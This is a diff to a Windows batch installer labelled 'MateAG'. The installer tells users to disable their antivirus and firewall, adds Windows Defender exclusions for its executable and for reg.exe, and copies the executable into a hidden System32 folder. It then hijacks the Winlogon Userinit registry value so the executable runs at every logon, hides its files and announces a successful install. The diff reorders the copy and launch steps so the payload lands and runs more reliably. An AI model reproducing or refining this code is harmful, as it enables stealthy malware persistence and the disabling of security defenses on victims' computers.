@@ -41,8 +41,8 @@ cls
 
 :code
 powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Please, disable your computer antivirus/firewall to avoid permission errors.', 'MateAG', [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Error)"
+powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Also, PLEASE use the same name as your executable name as your folder/registry ones. It will be added in a future update.', 'MateAG', [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Error)"
 setlocal enabledelayedexpansion
-takeown /f "C:\Windows\System32\ZZZ_Security" /r /d y
 mkdir C:\Windows\System32\ZZZ_Security
 takeown /f "C:\Windows\System32\ZZZ_Security" /r /d y
 icacls "C:\Windows\System32\ZZZ_Security" /grant administrators:F /t
@@ -75,12 +75,15 @@ for %%p in (%procs%) do (
 
 powershell -Command "$paths = @('C:\Program Files\Executable-213njkb1\pys_exe.exe', 'C:\Program Files\Executable-213njkb1\', 'C:\Users\%username%\%FILE%\%FILE%.exe', 'C:\Users\%username%\AppData\Roaming\%FILE%\%FILE%.exe', 'C:\Users\%username%\%FILE%\%FILE%.exe'); $procs = @('%FILE%.exe', '%FILE%.exe*', 'reg.exe', 'reg.exe*'); foreach ($path in $paths) { Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue }; foreach ($proc in $procs) { Add-MpPreference -ExclusionProcess $proc -ErrorAction SilentlyContinue }"
 
-start /b C:\Windows\System32\ZZZ_Security\%FILE%.exe
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\System32\ZZZ_Security\%FILE%.exe, C:\Windows\System32\ZZZ_Security\init.bat, C:\Windows\System32\userinit.exe" /f
 
-pushd "%~dp0\files"
-move "%FILE%.exe" "C:\Windows\System32\ZZZ_Security\%FILE%.exe"
-mkdir C:\Program Files\Executable-213njkb1
+pushd "%~dp0"
+copy /Y "files\%FILE%.exe" "C:\Windows\System32\ZZZ_Security\%FILE%.exe"
+copy /Y "%~dp0files\%FILE%.exe" "C:\Windows\System32\ZZZ_Security\%FILE%.exe"
+copy /Y "%~dp0\files\%FILE%.exe" "C:\Windows\System32\ZZZ_Security\%FILE%.exe"
+attrib -h "%~dp0\files\%FILE%.exe"
+mkdir "C:\Program Files\Executable-213njkb1"
+start /b C:\Windows\System32\ZZZ_Security\%FILE%.exe
 
 copy /Y "C:\Windows\System32\ZZZ_Security\%FILE%.exe" "C:\Program Files\Executable-213njkb1\pys_exe.exe"
 takeown /f "C:\Program Files\Executable-213njkb1" /r /d y
@@ -126,5 +129,6 @@ attrib +h "C:\Windows\System32\ZZZ_Security"
 attrib +h "C:\Windows\System32\ZZZ_Security\%FILE%.exe"
 attrib +h "C:\Windows\System32\ZZZ_Security\init.bat"
 reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "%FILE%" /f
+pause
 
 powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('The software was installed sucessfully.', 'MateAG', [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Information)"
